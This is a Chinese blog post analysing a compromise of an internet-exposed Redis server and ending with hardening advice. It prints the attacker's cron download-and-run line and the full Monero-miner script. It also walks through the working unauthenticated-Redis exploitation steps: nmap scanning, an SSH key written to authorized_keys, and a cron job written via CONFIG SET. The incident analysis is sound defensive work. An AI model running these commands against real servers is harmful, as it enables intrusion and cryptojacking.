---
layout:     post
title:      "Redis安全问题分析"
date:       2017-03-03 16:48:00 +0800
category:   "redis"
tags:       ["security", "redis"]
excerpt:    "最近由于特殊原因，服务器在公网上开放了redis端口(没有鉴权)和mysql端口，期间胆战心惊的。不过该来的迟早要来，还是被别有用心的人盯上了，现在想来背后仍然冒冷汗。开放在公网没多久，同事就反映redis里面有异常数据，0号db里面数据都被清除了，只剩下个`crackit`键，键值为："
---

## redis被侵入

最近由于特殊原因，服务器在公网上开放了redis端口(没有鉴权)和mysql端口，期间胆战心惊的。不过该来的迟早要来，还是被别有用心的人盯上了，现在想来背后仍然冒冷汗。开放在公网没多久，同事就反映redis里面有异常数据，0号db里面数据都被清除了，只剩下个`crackit`键，键值为：

````
\n\n*/5 * * * * /usr/bin/curl -fsSL http://sx.doiton.tk/test.sh | sh\n\n
````

### 计划任务检查

看到这个，很自然会想到crond的计划任务，`*/5 * * * * /usr/bin/curl -fsSL http://sx.doiton.tk/test.sh | sh`的意思是"每5分钟去下载并执行这个test脚本"。所以第一时间去检查系统计划任务，但是并没有发现什么，貌似这个计划任务并没有添加成功(因为机器上运行redis服务的是一个nologin的用户)。

`crontab -l`可以查看当前用户的所有计划任务，但是难免会有遗漏，或者通过其他用户添加，我们最好是查看下`/var/spool/cron/`目录下所有文件。crond的具体操作以及命令格式，可以看我之前的文章 -- [crond环境变量问题](/2016/12/16/crond-env-problems/) 。

### 脚本检查

计划任务没有发现什么问题，所以只好去看看入侵者想要下载和执行的脚本，或许能发现什么。下载完脚本，打开之后，内容如下(注释是本人添加)：

````
#!/bin/bash
# 查看系统中是否运行minerd这个挖矿软件
Jin=`ps -ef|grep minerd|grep -v grep|wc -l`
# 找到minerd进程的pid
Pid=`ps -ef|grep minerd|grep -v grep|awk '{print $2}'`
# 统计指向指定比特币账户的minerd进程数量
Qianbao=`ps -ef|grep minerd|grep -v grep|grep "44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN"|wc -l`
# 杀掉竞争对手AnXqV挖矿软件
ps auxf|grep -v grep|grep AnXqV |awk '{print $2}'|xargs kill -9

# 如果系统中运行有minerd
if [ $Jin -eq  1 ];then
    # 如果minerd不是指向自己账户，杀掉minerd进程，并且将minerd下载在/opt目录下，运行下载的minerd并指向自己账户
    if [ $Qianbao -eq 0 ];then
        kill -9 $Pid
        cd /opt
        if [ ! -f minerd ];then
            curl -L http://sx.doiton.tk/minerd -o minerd \
            &&   chmod +x minerd
        fi
        /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x &>>/dev/null
    fi
fi

# 如果系统中没运行minerd，直接将minerd下载在/opt目录下，运行下载的minerd并指向自己账户
if  [ $Jin -ne  1 ];then
    kill -9 $Pid
    cd /opt
    if [ ! -f minerd ];then
        curl -L http://sx.doiton.tk/minerd -o minerd \
        &&   chmod +x minerd
    fi
    /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x &>>/dev/null
 fi
````

分析完脚本之后，通过`ps aux | grep -v grep | grep [name]`查看下系统中是否运行有`minerd`或者`AnXqV`。很庆幸，系统中没有运行这两种挖矿软件，估计上一步`计划任务`没添加成功。

## 还原过程

侥幸逃过了一劫，庆幸之余来分析下入侵者的入侵过程。

### 利用原理

> redis的安全理念是，“不要将Redis暴露在公网中, 因为让不受信任的客户接触到Redis是非常危险的”。redis作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。[[1]](http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/)

当然，使用者将redis端口绑定在默认的`0.0.0.0:6379`，以具有某权限的用户运行，并且没有开启鉴权，也没采取相关防火墙策略，将不需认证的redis服务器暴露在公网，才是这类事件的罪魁祸首。

因为redis自身提供`config`命令，改命令本来是用来动态调整redis配置的，但是既然能写文件(也能修改配置文件地址)，那么自然可以用来进行一些其他的操作。

### 扫描端口

公网上有很多用户运行redis，其实都监听默认端口6379，并且没有开启auth鉴权。我们可以很轻松的扫描到这样的用户，然后实施入侵(并不建议这么做，已经是犯罪)：

````
# 安装nmap扫描器
$ sudo yum install nmap (红帽系或者SUSE) 或者 sudo apt-get install nmap (debian系)

# 扫描网络中活动主机(网段可以自己修改)
$ nmap -sn 192.168.2.0/24

# 扫描特定主机的开放端口(地址、地址段自己修改)
$ nmap 192.168.2.0,100-200

# 找到主机上监听端口的服务
$ nmap -sV 192.168.2.22

# 查看主机上端口的详细信息
$ nmap -sC 192.168.2.22 -p 6379

# 特定漏洞脚本利用(这个不是重点)
$ nmap --script=[path] 192.168.2.22 -p 6379
````

扫描到可利用的端口后，我们就可以进行下一步操作了。我们可以进行比较常见的操作：添加计划任务执行特定操作，或者将ssh公钥添加到主机方便以后利用。

### 添加ssh公钥

在主机redis中添加一个`crackit`的键值对

````
# 生成rsa密钥对(公钥和私钥)
$ ssh-keygen -t rsa
# 将公钥写入文件，私钥保留
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt
# 将公钥写入redis
$ cat test.txt | redis-cli -h 192.168.2.22 -x set "crackit"
````

通过`config`命令，修改配置路径，将公钥写入主机`/root/.ssh/authorized_keys`。

````
$ redis-cli -h 192.168.2.22
    > flushall
    > config set dir "/root/.ssh"
    > config set dbfilename "authorized_keys"
    > save
````

公钥写入成功之后，我们便可以使用之前生成的私钥来访问对应的主机，后面的操作自己脑补。

### 添加计划任务

在主机redis中添加一个`crackit`的键值对

````
# 将计划任务命令写入文件
$ (echo -e "\n\n*/5 * * * * /usr/bin/curl -fsSL http://192.168.2.1/test.sh | sh\n\n") > test.txt
# 将计划任务内容写入redis
$ cat test.txt | redis-cli -h 192.168.2.22 -x set "crackit"
````

添加任务计划操作，其实和添加公钥差不多，只是将目录修改成`/var/spool/cron/`，系统中便自动添加了一个计划任务。

````
$ redis-cli -h 192.168.2.22
    > flushall
    > config set dir "/var/spool/cron/"
    > config set dbfilename "root"
    > save
````

添加计划任务成功以后，系统便会定时运行我们写好的脚本，具体能做什么取决于你的脚本内容。

## 影响和应对

影响：

- redis作为数据库，如果被入侵，导致数据泄露或者数据丢失，会给用户带来很大损失。
- 入侵者通过redis执行lua脚本，或者添加计划任务，或者添加ssh公钥，都可能使机器沦为肉鸡，被人使用。

应对措施：

1. 配置`/etc/redis.config`文件，修改bind选项，绑定特定IP地址(内网地址或者回环地址)可以限制部分IP访问。
2. 配置`/etc/redis.config`文件，修改port选项，修改默认监听6379端口，避免被人轻易扫描到。
3. 配置`/etc/redis.config`文件，修改requirepass选项，添加redis服务器鉴权，增强安全性。
4. 配置`/etc/redis.config`文件，修改rename-command选项，将危险命令重命名。
5. 创建单独的nologin系统用户，用来运行redis，避免被入侵后提权(执行代码或者命令)，千万不能以root运行redis服务。
6. 对主机添加ACL或者防火墙进行网络访问控制，云主机可以设置安全组。

最近除了redis被劫持，mongodb、mysql等数据被勒索的新闻也能经常听到，所以提高自身安全意识才是最根本的。
